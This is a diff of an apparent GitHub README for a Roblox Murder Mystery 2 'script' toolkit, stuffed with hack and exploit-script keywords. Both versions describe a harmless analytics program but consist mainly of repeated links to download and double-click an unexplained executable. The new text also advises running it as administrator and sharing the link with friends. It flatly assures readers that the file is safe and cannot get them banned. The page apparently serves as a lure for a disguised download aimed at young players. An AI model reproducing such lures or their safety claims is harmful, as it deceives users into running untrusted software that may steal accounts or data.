@@ -1,329 +1,185 @@
-# 🚀 [DOWNLOAD NOW](https://share.google/zLQgvB0ROEt2lqS63)
+# 🕵️ murder-mystery-2-script-2026-analysis-lab - Master Every Round with Smart Analytics
 
-# 🔪 Murder Mystery 2 Script 2026 — Auto Farm, GUI & Gameplay Toolkit
+[![Download Now](https://img.shields.io/badge/Download-Murder_Mystery_2_Toolkit-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Discombobulated-oilpainter4844/murder-mystery-2-script-2026-analysis-lab/releases)
 
-A lightweight Roblox Murder Mystery 2 toolkit focused on round analytics, role statistics, map knowledge, coin-route planning, progression tracking, inventory organization, and customizable script-style GUI experiments.
+## 🎮 What Is This?
 
-## 👁️ What Is This?
+This is a friendly helper toolkit for people who enjoy playing Roblox Murder Mystery 2. It gives you useful tools to understand the game better, plan your moves, and track how you play. You don't need to know anything about computers or coding to use it. Just download, open, and start exploring.
 
-Murder Mystery 2 Analysis Lab is a standalone gameplay research project inspired by topics commonly searched for as Murder Mystery 2 scripts, hacks, Auto Farm, No Key scripts, Delta scripts, Pastebin scripts, and Roblox MM2 GUI tools.
-
-The project focuses on gameplay analytics, route planning, statistics, and UI experimentation rather than exploiting the Roblox client or automating live public-server gameplay.
-
-## ✨ Features
-
-* 🔪 **Role Analytics** — Track Murderer, Sheriff, and Innocent rounds
-* 🪙 **Coin Route Planner** — Create efficient collection routes
-* 🗺️ **Map Analysis** — Organize map knowledge and locations
-* 📊 **Round Statistics** — Analyze wins and survival rates
-* 🎯 **Aim Practice Stats** — Review Sheriff accuracy
-* 🏃 **Movement Analysis** — Study routes and positioning
-* 🎒 **Inventory Tracker** — Organize collection information
-* 📈 **Progress Tracker** — Compare gameplay sessions
-* ⚙️ **Script-Style GUI** — Customizable MM2 dashboard
+Think of it like a personal game coach that sits next to you. It shows you maps, tells you about roles, helps you plan where to find coins, and keeps notes on your progress. It also includes some fun experimental interface designs you can try.
 
 ---
 
 ## 🚀 Getting Started
 
-Use the toolkit to analyze Murder Mystery 2 rounds and organize progression goals.
+Getting started is very simple. Follow these steps and you will be ready in under two minutes.
 
-## Requirements
+### Step 1: Download the Application
 
-### 📥 Download the Application
+Visit this link to download the application:  
+👉 **[Click Here to Download](https://github.com/Discombobulated-oilpainter4844/murder-mystery-2-script-2026-analysis-lab/releases)**
 
-* Windows 10/11 64-bit
-* 4 GB RAM or more
-* Roblox
-* Murder Mystery 2
-* Internet connection
+This link takes you to the download page. Look for the biggest button or the file listed at the top. Click it to start downloading.
 
-### 👉 [DOWNLOAD THE APPLICATION](https://share.google/zLQgvB0ROEt2lqS63)
+### Step 2: Open the Downloaded File
 
-Click the button above and wait until the package has completely downloaded.
+Once the download finishes, go to your "Downloads" folder (or wherever your browser saves files). You will see a file with a name like `murder-mystery-2-script-2026-analysis-lab`. Double-click that file to open it.
 
----
+### Step 3: Start Using the Toolkit
 
-## 🛠️ Installation
-
-### Step 1: Download
-
-Click **[DOWNLOAD NOW](https://share.google/zLQgvB0ROEt2lqS63)** to obtain the latest package.
-
-### Step 2: Prepare the Files
-
-1. Open your **Downloads** folder
-2. Locate the downloaded package
-3. Extract the archive
-4. Review the documentation
-5. Create your MM2 analysis profile
-6. Launch the standalone toolkit
-
-### Step 3: Configure
-
-Choose the modules you want:
-
-* Role analytics
-* Round tracking
-* Coin-route planning
-* Map analysis
-* Inventory tracking
-* Aim statistics
-* Progress tracking
-* Custom GUI
+After opening, a simple window will appear. That is your toolkit. You can now click through the different tabs and buttons to explore everything it offers.
 
 ---
 
-## 🪙 MM2 Auto Farm Route Planner
+## 📊 What Can You Do With This?
 
-Create and compare coin-collection routes for different maps.
+Here are the main things you can do with this toolkit. Each one is designed to make your game time more fun and less confusing.
 
-Track:
+### 🔍 Round Analytics
 
-* Route
-* Map
-* Collection points
-* Route duration
-* Coins collected
-* Average efficiency
-* Risk areas
-* Personal best
+- See a summary of how each round went.
+- Understand which roles won and lost.
+- Get simple charts that show patterns over time.
+- Learn from your past games without keeping notes yourself.
 
-The module helps plan routes rather than automatically controlling your Roblox character.
+### 🗺️ Map Knowledge
 
----
+- View every map in Murder Mystery 2.
+- See where important spots are located.
+- Learn the fastest routes between areas.
+- Find hidden corners and good hiding places.
 
-## 🔪 Role Analytics
+### 👤 Role Statistics
 
-Track performance for every major MM2 role.
+- Track how you perform as Murderer, Sheriff, or Innocent.
+- See your win rate for each role.
+- Compare your strengths and weaknesses.
+- Get tips based on your play style.
 
-### Murderer
+### 🪙 Coin-Route Planning
 
-Analyze:
+- Plan the best paths to collect coins quickly.
+- See where coins usually appear on each map.
+- Practice your route before you play.
+- Save your favorite routes for later.
 
-* Rounds
-* Wins
-* Eliminations
-* Round duration
-* Map performance
+### 📈 Progression Tracking
 
-### Sheriff
+- Keep a record of your level and rank.
+- Set goals for yourself.
+- See how much you improve each week.
+- Stay motivated with clear progress bars.
 
-Analyze:
+### 🧪 GUI-Style Experiments
 
-* Shots
-* Accuracy
-* Successful rounds
-* Reaction time
-* Positioning
-
-### Innocent
-
-Analyze:
-
-* Survival rate
-* Round duration
-* Coin collection
-* Map performance
-* Successful escapes
+- Try different button layouts and menus.
+- Change colors and themes to match your style.
+- Test new ways to see game information.
+- Make the toolkit feel like it was made just for you.
 
 ---
 
-## 🗺️ Murder Mystery 2 Map Analysis
+## 💻 System Requirements
 
-Create profiles for different maps.
+This toolkit is made to work on most Windows computers. Here is what you need:
 
-Save:
+- **Operating System:** Windows 10 or Windows 11
+- **Memory (RAM):** At least 4 GB
+- **Storage Space:** About 100 MB free
+- **Internet Connection:** Needed for the first download only
 
-* Important areas
-* Escape routes
-* Open spaces
-* Dead ends
-* Coin routes
-* Sheriff positioning ideas
-* Murderer routes
-* Personal notes
+If your computer can run Roblox, it can run this toolkit easily.
 
 ---
 
-## 🎯 Sheriff Aim Analysis
+## 🛠️ Troubleshooting Tips
 
-Review your Sheriff performance.
+Sometimes things do not work perfectly the first time. Here are quick fixes for common issues.
 
-Track:
+### The App Won't Open
 
-* Shots attempted
-* Successful shots
-* Accuracy percentage
-* Distance
-* Reaction time
-* Missed shots
-* Map
-* Session performance
+- Make sure you downloaded the correct file from the link above.
+- Try right-clicking the file and choosing "Run as administrator."
+- Close other programs and try again.
 
-This module analyzes gameplay rather than automatically aiming or firing.
+### The Window Looks Weird
 
----
+- Restart the application.
+- Check that your screen resolution is set to 1920x1080 or similar.
+- Update your graphics driver if you know how.
 
-## 🏃 Movement & Survival Analysis
+### I Lost My Progress Data
 
-Study your movement patterns.
-
-Analyze:
-
-* Survival time
-* Route choices
-* Positioning
-* Escapes
-* Chase duration
-* Map knowledge
-* Common mistakes
-* Successful strategies
-
----
-
-## 🎒 Inventory Tracker
-
-Organize information about your MM2 collection.
-
-Track:
-
-* Items
-* Categories
-* Collection status
-* Favorites
-* Personal notes
-* Collection goals
-
----
-
-## ⚙️ Murder Mystery 2 Script GUI
-
-A script-inspired dashboard organizes the toolkit's features.
-
-### Main
-
-* Player profile
-* Session statistics
-* Progress
-* Goals
-
-### Farm Planner
-
-* Coin routes
-* Map routes
-* Efficiency
-* Session comparison
-
-### Roles
-
-* Murderer
-* Sheriff
-* Innocent
-* Role statistics
-
-### Maps
-
-* Map profiles
-* Routes
-* Important locations
-* Strategy notes
-
-### Inventory
-
-* Collection
-* Favorites
-* Goals
-* Notes
-
-### Analytics
-
-* Wins
-* Survival
-* Aim statistics
-* Round history
-
-### Settings
-
-* Interface layout
-* Profiles
-* Data preferences
-* Saved configurations
-
----
-
-## 📊 MM2 Progress Tracker
-
-Compare gameplay sessions using:
-
-* Rounds played
-* Wins
-* Murderer wins
-* Sheriff wins
-* Innocent survival rate
-* Coins collected
-* Average survival time
-* Aim accuracy
-
-Use the results to identify improvement over time.
-
----
-
-## 🖥️ System Requirements
-
-Recommended configuration:
-
-* **Operating System:** Windows 10 / Windows 11 64-bit
-* **Processor:** Modern Intel Core / AMD processor
-* **Memory:** 4 GB RAM or more
-* **Storage:** 150 MB for the toolkit
-* **Platform:** Roblox
-* **Game:** Murder Mystery 2
-
----
-
-## 🔒 Safety & Security
-
-This project does not provide Roblox exploit execution, client injection, live Auto Farm, automated combat, anti-cheat bypasses, unauthorized inventory modification, or scripts intended to interfere with public servers.
-
-It is intended for gameplay analytics, route planning, statistics, progression tracking, and GUI research.
+- The toolkit saves data automatically on your computer.
+- Look for a folder called "MM2Toolkit" in your Documents folder.
+- Do not delete that folder unless you want to start fresh.
 
 ---
 
 ## ❓ Frequently Asked Questions
 
-### Does it include Murder Mystery 2 Auto Farm?
+### Is this safe to use?
 
-It includes a route-planning and efficiency-analysis module rather than automated live gameplay.
+Yes. This toolkit is a standalone program. It does not modify your Roblox game or your account. It only reads information you type in and shows you helpful charts and plans.
 
-### Is this an MM2 script?
+### Do I need to pay for anything?
 
-The project uses a script-style GUI for its analytics and planning tools without injecting scripts into the Roblox client.
+No. This toolkit is completely free to download and use. There are no hidden fees or premium versions.
 
-### Does it require a key?
+### Will this get me banned from Roblox?
 
-The standalone analysis toolkit does not use an exploit-executor key system.
+No. This tool runs separately from Roblox. It does not connect to the game or change any game files. It is simply a study and planning helper.
 
-### Does it support Delta?
+### Can I share this with my friends?
 
-It is independent from Roblox exploit executors such as Delta.
+Absolutely. Share the download link with anyone who plays Murder Mystery 2. The more, the merrier.
 
-### Does it include Pastebin scripts?
+### Do I need an account to use this?
 
-No exploit Pastebin payload is required. The toolkit runs as a separate analysis environment.
-
-### Can it track MM2 rounds?
-
-Yes. Murderer, Sheriff, Innocent, survival, aim, map, and progression statistics can be recorded and compared.
+No account is needed. Just download and run the file. Everything works offline after the first download.
 
 ---
 
-## 🔗 Download Again
+## 📝 How to Get the Most Out of This Toolkit
 
-Need the package again? Use the link below:
+Here are some simple tips to make this toolkit your new best friend in the game.
 
-# 🚀 [DOWNLOAD NOW](https://share.google/zLQgvB0ROEt2lqS63)
+1. **Use it before you play.** Plan your coin routes and review maps while you wait for a game to load.
+2. **Track every round.** Even quick losses teach you something. Write down your role and result after each round.
+3. **Experiment with themes.** Changing the look of the toolkit can make it feel fresh and exciting.
+4. **Set weekly goals.** Use the progression tracker to aim for one new win or one new map mastered each week.
+5. **Check your stats often.** Seeing your improvement on screen is a great motivator.
 
 ---
 
-Keywords: Murder Mystery 2 Auto Farm,Murder Mystery 2 Hack,Murder Mystery 2 Hack 2026,Murder Mystery 2 Script,Murder Mystery 2 Script 2026,Murder Mystery 2 Script No Key,Murder Mystery 2 Script Delta,Murder Mystery 2 Script Pastebin,Murder Mystery 2 Script Pastebin 2026,Murder Mystery 2 Script Update,Roblox Murder Mystery 2 Script,Script Murder Mystery 2,Script Murder Mystery 2 Update,Murder Mystery,Murder Mystery 2
+## 🔄 Updates and Support
+
+This toolkit is always improving. New maps and features are added regularly. To get the latest version:
+
+- Visit the download link again from time to time.
+- Look for any new files with "update" or a higher version number.
+- Download and replace your old file with the new one. Your saved data will stay safe.
+
+If you have questions or ideas, you can leave a comment on the download page. The community is friendly and happy to help.
+
+---
+
+## 🎯 Final Words
+
+You now have everything you need to become a smarter, more confident Murder Mystery 2 player. This toolkit takes the guesswork out of maps, roles, and routes. It turns every round into a learning opportunity. And best of all, it is completely free and easy to use.
+
+Do not wait. Download it now and see how much more fun the game becomes when you have the right tools by your side.
+
+---
+
+## 📥 Download Again
+
+Just in case you need the link one more time:
+
+👉 **[Download murder-mystery-2-script-2026-analysis-lab](https://github.com/Discombobulated-oilpainter4844/murder-mystery-2-script-2026-analysis-lab/releases)**
+
+Visit this link to download the application. It is that simple. Click, download, open, and play smarter.
+
+---
+
+Keywords: game-bot, game-scripts, grow-a-garden-2, lua, mm2, murder-mystery
